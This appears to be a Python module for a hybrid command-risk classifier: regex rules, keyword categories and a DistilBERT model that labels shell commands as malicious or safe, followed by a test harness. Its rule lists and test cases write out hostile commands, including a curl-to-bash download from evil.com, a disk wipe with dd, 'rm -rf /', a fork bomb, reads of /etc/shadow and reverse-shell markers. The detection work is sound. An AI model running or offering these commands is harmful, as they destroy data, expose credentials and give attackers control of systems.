# risk_model.py — Final production version
# Hybrid: Rules (hard safety) + DistilBERT (learned patterns)
# Improvements: Risk categories, severity levels, explanations, uncertainty handling

import torch
import re
import warnings
from transformers import DistilBertForSequenceClassification, DistilBertTokenizer

# Suppress the sdpa attention warning
warnings.filterwarnings("ignore", message=".*sdpa attention does not support.*")

# ── Hard-coded rules ───────────────────────────────────────────────────────────
HARD_RULES = [
    # Kill all processes
    (r"kill\s+-9\s+-1",                               "Kills all processes on system"),
    (r"kill\s+-SIGKILL\s+-1",                         "Kills all processes on system"),
    (r"killall\s+-9\s+-r\s+['\"]?\.\*",               "Kills all matching processes"),
    # Sudo privilege escalation
    (r"sudo\s+(su|bash|sh|zsh|fish|csh|tcsh)(\s|$|-)", "Privilege escalation to root shell"),
    (r"sudo\s+-[si](\s|$)",                            "Sudo interactive shell"),
    (r"sudo\s+/bin/(bash|sh|zsh)",                     "Direct root shell via sudo"),
    (r"su\s+-\s*$",                                    "Switch to root user"),
    (r"su\s+root",                                     "Switch to root user"),
    # History clearing
    (r"history\s+-[cwdr]",                             "Clearing command history"),
    (r"set\s+\+o\s+history",                           "Disabling history logging"),
    (r"HISTFILE\s*=\s*/dev/null",                      "Redirecting history to null"),
    (r"HISTSIZE\s*=\s*0",                              "Setting history size to zero"),
    # Disk destruction
    (r"dd\s+if=/dev/(zero|urandom|null)\s+of=/dev/[a-z]", "Disk wipe command"),
    (r"mkfs\.\w+\s+/dev/[a-z]{2,}[^/]",               "Formatting disk device"),
    (r"shred\s+.*(/dev/[a-z]|/etc/passwd|/etc/shadow)", "Secure file deletion of critical resource"),
    (r"wipefs\s+-a\s+/dev/",                           "Wiping filesystem signatures"),
    # Fork bomb
    (r":\(\)\s*\{.*:\|:.*\}",                          "Fork bomb detected"),
    (r"while true.*fork",                              "Infinite fork loop"),
    # SUID bit
    (r"chmod\s+(u\+s|4[0-9]{3})\s+",                  "Setting SUID bit (privilege escalation)"),
    (r"chmod\s+\+s\s+/",                               "Setting SUID on system binary"),
]

# ── Safe whitelist ─────────────────────────────────────────────────────────────
SAFE_WHITELIST = [
    r"cat\s+/etc/hosts$",
    r"cat\s+/etc/hostname$",
    r"cat\s+/etc/os-release$",
    r"cat\s+/etc/timezone$",
    r"cat\s+/proc/version$",
    r"cat\s+/etc/shells$",
]

# ── Risk categories ────────────────────────────────────────────────────────────
RISK_CATEGORIES = {
    "reverse_shell"       : ("CRITICAL", "Attempts to open a remote shell connection to attacker"),
    "sensitive_file"      : ("HIGH",     "Reads sensitive system credentials or private keys"),
    "privilege_escalation": ("CRITICAL", "Attempts to gain unauthorized root/admin access"),
    "cover_tracks"        : ("HIGH",     "Attempts to erase command history and activity logs"),
    "destructive"         : ("CRITICAL", "Destroys system files, disk data, or processes"),
    "download_execute"    : ("HIGH",     "Downloads and executes remote malicious code"),
    "exfiltration"        : ("HIGH",     "Sends sensitive data to an external server"),
    "network_scan"        : ("MEDIUM",   "Scans network for open ports or vulnerabilities"),
    "persistence"         : ("HIGH",     "Installs a backdoor for persistent unauthorized access"),
    "cryptomining"        : ("MEDIUM",   "Uses system resources for unauthorized cryptocurrency mining"),
    "disable_security"    : ("HIGH",     "Disables firewall or security monitoring services"),
    "unknown"             : ("HIGH",     "Suspicious command pattern detected by AI model"),
}


def get_category(command: str) -> tuple[str, str, str]:
    """Returns (category, severity, explanation) for a malicious command."""
    cmd = command.lower()

    if any(x in cmd for x in ["/dev/tcp", "/dev/udp", "fsockopen",
                                "tcpsocket", "nc -e", "ncat -e",
                                "socat exec", "-i >& /dev/tcp"]):
        cat = "reverse_shell"

    elif any(x in cmd for x in ["/etc/shadow", "id_rsa", "id_ed25519",
                                  "authorized_keys", "/.aws/credentials",
                                  "/.netrc", "/etc/sudoers",
                                  "/root/.ssh", "~/.ssh"]):
        cat = "sensitive_file"

    elif any(x in cmd for x in ["sudo su", "sudo bash", "sudo sh",
                                  "sudo -s", "sudo -i", "sudo /bin/",
                                  "chmod u+s", "chmod 4", "chmod +s",
                                  "su root", "su -"]):
        cat = "privilege_escalation"

    elif any(x in cmd for x in ["history -c", "history -w", "unset hist",
                                  "histfile=/dev/null", "histsize=0",
                                  "bash_history", "/var/log/auth",
                                  "/var/log/syslog", "rm -rf /var/log"]):
        cat = "cover_tracks"

    elif any(x in cmd for x in ["rm -rf /", "rm -rf /*", "dd if=/dev/zero",
                                  "dd if=/dev/urandom", "mkfs.", "shred",
                                  "wipefs", "kill -9 -1", ":(){ :|:& };:",
                                  "fork bomb"]):
        cat = "destructive"

    elif (any(x in cmd for x in ["curl", "wget", "fetch", "lwp"]) and
          any(x in cmd for x in ["| bash", "| sh", "| python", "-o- |",
                                   "http://", "https://"])):
        cat = "download_execute"

    elif (any(x in cmd for x in ["| nc ", "| curl -t", "scp /etc",
                                   "| curl -d", "rsync /etc", "zip -r -"]) and
          any(x in cmd for x in ["/etc", "/home", "/root", "passwd", "shadow"])):
        cat = "exfiltration"

    elif any(x in cmd for x in ["nmap", "masscan", "zmap", "arp-scan",
                                  "netdiscover", "hping3"]):
        cat = "network_scan"

    elif (any(x in cmd for x in ["crontab", "rc.local", "rc.d", ".bashrc",
                                   ".profile", "systemctl enable"]) and
          any(x in cmd for x in ["backdoor", "malware", "shell", "/tmp",
                                   "evil", "http://", "nc ", "bash -i"])):
        cat = "persistence"

    elif any(x in cmd for x in ["xmrig", "minexmr", "cryptonight",
                                  "monero", "pool.mine", "donate-level"]):
        cat = "cryptomining"

    elif any(x in cmd for x in ["systemctl disable firewall",
                                  "systemctl stop firewall",
                                  "ufw disable", "iptables -f",
                                  "setenforce 0", "aa-teardown"]):
        cat = "disable_security"

    else:
        cat = "unknown"

    severity, explanation = RISK_CATEGORIES[cat]
    return cat, severity, explanation


def check_whitelist(command: str) -> bool:
    """Returns True if command is explicitly safe."""
    for pattern in SAFE_WHITELIST:
        if re.search(pattern, command.strip(), re.IGNORECASE):
            return True
    return False


def check_hard_rules(command: str) -> tuple[bool, str | None]:
    """Returns (True, reason) if command matches a hard rule."""
    for pattern, reason in HARD_RULES:
        if re.search(pattern, command, re.IGNORECASE):
            return True, reason
    return False, None


# ── Load DistilBERT model ──────────────────────────────────────────────────────
MODEL_PATH = "./models/distilbert_risk_model"

tokenizer = DistilBertTokenizer.from_pretrained(MODEL_PATH)
# Load model with eager attention to avoid warnings and support output_attentions
model = DistilBertForSequenceClassification.from_pretrained(
    MODEL_PATH,
    attn_implementation="eager"  # Use eager attention instead of sdpa
)
device    = torch.device("cuda" if torch.cuda.is_available() else "cpu")
model     = model.to(device)
model.eval()


def predict_risk(command: str) -> tuple[str, float, str]:
    """
    Returns: (label, confidence, reason)
      label      : "MALICIOUS", "SUSPICIOUS", "UNCERTAIN", or "SAFE"
      confidence : float 0-1
      reason     : explanation string
    """
    command = command.strip()
    if not command:
        return "SAFE", 1.0, "Empty command"

    # Step 0 — Whitelist
    if check_whitelist(command):
        return "SAFE", 1.0, "Whitelisted safe command"

    # Step 1 — Hard rules
    is_dangerous, reason = check_hard_rules(command)
    if is_dangerous:
        return "MALICIOUS", 1.0, f"Rule match: {reason}"

    # Step 2 — DistilBERT
    inputs = tokenizer(
        command,
        return_tensors="pt",
        truncation=True,
        max_length=128,
        padding="max_length"
    )
    inputs = {k: v.to(device) for k, v in inputs.items()}

    with torch.no_grad():
        logits = model(**inputs).logits

    probs      = torch.softmax(logits, dim=1)
    pred       = torch.argmax(logits, dim=1).item()
    confidence = probs[0][pred].item()

    # Step 3 — Uncertainty handling
    if confidence < 0.60:
        return "UNCERTAIN", confidence, "Model confidence too low — please verify manually"

    if pred == 1:
        if confidence < 0.80:
            return "SUSPICIOUS", confidence, "Model detection (low confidence)"
        return "MALICIOUS", confidence, "Model detection"

    return "SAFE", confidence, "Model detection"


def explain_prediction(command: str) -> list[tuple[str, float]]:
    """
    Returns top 5 (token, attention_score) pairs showing
    which words triggered the classification.
    """
    inputs = tokenizer(
        command,
        return_tensors="pt",
        truncation=True,
        max_length=128,
        padding="max_length",
        return_attention_mask=True
    )
    inputs = {k: v.to(device) for k, v in inputs.items()}

    with torch.no_grad():
        # Only request attentions if they're available (they are with eager attention)
        outputs = model(**inputs, output_attentions=True)

    # Check if attentions are available
    if not hasattr(outputs, 'attentions') or outputs.attentions is None:
        # Fallback: return empty list if attentions not available
        return []

    # Last layer, average across heads, CLS token row
    attentions    = outputs.attentions[-1]
    avg_attention = attentions.mean(dim=1)[0]
    cls_attention = avg_attention[0]

    tokens = tokenizer.convert_ids_to_tokens(inputs["input_ids"][0])

    token_scores = []
    for token, score in zip(tokens, cls_attention):
        if token not in ["[PAD]", "[CLS]", "[SEP]"]:
            clean = token.replace("##", "")
            if clean.strip():
                token_scores.append((clean, score.item()))

    token_scores.sort(key=lambda x: x[1], reverse=True)
    return token_scores[:5]


# ── Test ───────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    test_commands = [
        ("sudo su -",                          "MALICIOUS"),
        ("sudo bash",                          "MALICIOUS"),
        ("history -c",                         "MALICIOUS"),
        ("kill -9 -1",                         "MALICIOUS"),
        ("dd if=/dev/zero of=/dev/sda bs=1M",  "MALICIOUS"),
        ("chmod u+s /bin/bash",                "MALICIOUS"),
        (":(){ :|:& };:",                      "MALICIOUS"),
        ("cat /etc/shadow",                    "MALICIOUS"),
        ("curl evil.com/shell.sh | bash",      "MALICIOUS"),
        ("rm -rf /",                           "MALICIOUS"),
        ("ls -la",                             "SAFE"),
        ("git commit -m 'update'",             "SAFE"),
        ("sudo apt install python3",           "SAFE"),
        ("kill -9 1234",                       "SAFE"),
        ("history | grep ssh",                 "SAFE"),
        ("cat file.txt",                       "SAFE"),
        ("cat /etc/hosts",                     "SAFE"),
        ("systemctl status ssh",               "SAFE"),
    ]

    print("=" * 75)
    print(f"{'Command':<45} {'Expected':<12} {'Result'}")
    print("=" * 75)

    correct = 0
    for cmd, expected in test_commands:
        label, conf, reason = predict_risk(cmd)
        result_label = "SAFE" if label == "SAFE" else "MALICIOUS"
        status = "✅" if result_label == expected else "❌"
        if result_label == expected:
            correct += 1
        print(f"{status} {cmd:<45} {label:<12} ({conf:.0%}) — {reason}")

        # Show category for malicious commands
        if label in ("MALICIOUS", "SUSPICIOUS"):
            cat, severity, explanation = get_category(cmd)
            print(f"   Category: {cat} | Severity: {severity}")
            print(f"   Explanation: {explanation}")

        # Show attention for interesting cases
        if label == "MALICIOUS" and conf > 0.90:
            tokens = explain_prediction(cmd)
            if tokens:
                top_tokens = ", ".join([f"'{t}' ({s:.2f})" for t, s in tokens[:3]])
                print(f"   Key tokens: {top_tokens}")
        print()

    print("=" * 75)
    print(f"Score: {correct}/{len(test_commands)} correct ({correct/len(test_commands):.0%})")